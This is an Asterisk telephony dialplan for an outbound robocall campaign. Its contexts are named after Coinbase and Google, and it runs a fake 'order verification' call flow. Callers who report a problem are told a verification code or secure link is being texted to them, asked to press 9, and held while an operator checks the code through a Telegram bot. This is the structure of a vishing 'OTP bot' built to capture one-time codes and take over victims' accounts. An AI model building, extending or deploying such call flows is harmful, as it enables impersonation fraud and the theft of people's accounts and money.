[outbound-coinbase]
; Enhanced context for order verification system
exten => _X.,1,Answer()
exten => _X.,n,Set(PHONE_NUMBER=${EXTEN})
exten => _X.,n,Set(CAMPAIGN_ID=${CAMPAIGN_ID})
exten => _X.,n,Set(CALL_START_TIME=${EPOCH})

; Play initial order verification message
exten => _X.,n,Playback(wave/Ifyouplacedtheorder)  ; "Thank you for your order. If you have placed an order, press 1. If there is an issue with your order, press 2."
exten => _X.,n,WaitExten(30)  ; Wait 30 seconds for DTMF input

; Handle no input - play message again once
exten => _X.,n,Playback(wave/Ifyouplacedtheorder)
exten => _X.,n,WaitExten(20)
exten => _X.,n,Playback(no-response-goodbye)  ; "We did not receive a response. Goodbye."
exten => _X.,n,Hangup()

; Option 1: Order confirmed - will be redirected by AMI to order-confirmed context
exten => 1,1,NoOp(Customer pressed 1 - Order confirmed)
exten => 1,n,Set(DTMF_RESULT=1)
exten => 1,n,Set(ORDER_STATUS=CONFIRMED)
; AMI will redirect to order-confirmed context

; Option 2: Issue with order - will be redirected by AMI to otp-process context
exten => 2,1,NoOp(Customer pressed 2 - Issue with order)
exten => 2,n,Set(DTMF_RESULT=2)
exten => 2,n,Set(ORDER_STATUS=ISSUE_REPORTED)
; AMI will redirect to otp-process context

; Option 9: Customer received OTP - will be redirected by AMI to verification-waiting context
exten => 9,1,NoOp(Customer pressed 9 - OTP received)
exten => 9,n,Set(OTP_ENTERED=1)
; AMI will redirect to verification-waiting context

; Timeout handler
exten => t,1,Playback(call-timeout-goodbye)  ; "Call timeout. Goodbye."
exten => t,n,Hangup()

; Invalid option handler  
exten => i,1,Playback(invalid-option)  ; "Invalid option. Please try again."
exten => i,n,Goto(outbound-coinbase,${PHONE_NUMBER},2)  ; Go back to main menu

; Order confirmation context - called by AMI redirect
[order-confirmed]
exten => s,1,NoOp(Order confirmed - playing thank you message)
exten => s,n,Playback(wave/ThanksWellContinueProcess)  ; "Thank you for confirming your order. Your order is being processed. Goodbye."
exten => s,n,Hangup()

; OTP process context - called by AMI redirect  
[otp-process]
exten => s,1,NoOp(Starting OTP process)
exten => s,n,Playback(wave/WeWillTextSecureVerifLink)  ; "We understand you have an issue with your order. A verification code is being sent to you. Once you receive the code, please press 9 to continue. Please hold while we send the code."
exten => s,n,MusicOnHold(HOLDMUSIC)  ; Put on hold - will wait for DTMF 9
exten => s,n,Playback(otp-timeout-goodbye)  ; If they don't press 9 in time
exten => s,n,Hangup()

exten => X,1,NoOp(Starting OTP process X)
exten => X,n,Playback(wave/WeWillTextSecureVerifLink)  ; "We understand you have an issue with your order. A verification code is being sent to you. Once you receive the code, please press 9 to continue. Please hold while we send the code."
exten => X,n,MusicOnHold(HOLDMUSIC)  ; Put on hold - will wait for DTMF 9
exten => X,n,Playback(otp-timeout-goodbye)  ; If they don't press 9 in time
exten => X,n,Hangup()

exten => _X,1,NoOp(Starting OTP process_X)
exten => _X,n,Playback(wave/WeWillTextSecureVerifLink)  ; "We understand you have an issue with your order. A verification code is being sent to you. Once you receive the code, please press 9 to continue. Please hold while we send the code."
exten => _X,n,MusicOnHold(default)  ; Put on hold - will wait for DTMF 9
exten => _X,n,Playback(otp-timeout-goodbye)  ; If they don't press 9 in time
exten => _X,n,Hangup()

; Handle DTMF 9 in OTP process context
exten => 9,1,NoOp(Customer pressed 9 in OTP context)
; AMI will redirect to verification-waiting context

; Verification waiting context - called by AMI redirect when customer presses 9
[verification-waiting] 
exten => s,1,NoOp(Customer entered OTP - waiting for admin verification)
exten => s,n,StopMusicOnHold()
exten => s,n,Playback(wave/ThanksReviewingNow)  ; "Thank you. We are now verifying your code. Please wait while we process this."
exten => s,n,MusicOnHold(default)  ; Wait for admin to verify via Telegram bot
; Admin will redirect via AMI to success or failed context

; Verification success context - called by AMI redirect when admin verifies
[verification-success]
exten => s,1,NoOp(OTP verification successful)
exten => s,n,StopMusicOnHold()
exten => s,n,Playback(wave/VerifisGOOD)  ; "Your verification is successful. Your order issue will be resolved shortly. Thank you for calling. Goodbye."
exten => s,n,Hangup()

; Verification failed context - called by AMI redirect when admin rejects
[verification-failed]
exten => s,1,NoOp(OTP verification failed)
exten => s,n,StopMusicOnHold()
exten => s,n,Playback(wave/VerifisNOgood)  ; "The verification code you provided is incorrect. Please contact us again to retry. Goodbye."
exten => s,n,MusicOnHold(default)  ; Wait for admin to verify via Telegram bot

; Keep existing Google context if needed
[outbound-google]
exten => _X.,1,Answer()
exten => _X.,n,Playback(googleintro)
exten => _X.,n,WaitExten(10)

exten => 1,1,Playback(googleoutro)
exten => 1,2,Hangup()

exten => _X.,n,Hangup()

; Alternative context name for order verification
[outbound-order-verification]
include => outbound-coinbase

; Emergency hangup context (can be called from AMI)
[hangup-context]
exten => s,1,Playback(call-terminated)
exten => s,n,Hangup()

; Test context for audio file testing
[test-context]
exten => s,1,Answer()
exten => s,n,Playback(${ARG1})
exten => s,n,Hangup()

; Test playback context
[test-playback-context]  
exten => s,1,Answer()
exten => s,n,Playback(order-verification-intro)
exten => s,n,Playback(thank-you-order-confirmed)
exten => s,n,Playback(otp-being-sent-press-9)
exten => s,n,Playback(verifying-please-wait)
exten => s,n,Playback(order-verified)
exten => s,n,Playback(verification-failed-retry)
exten => s,n,Hangup()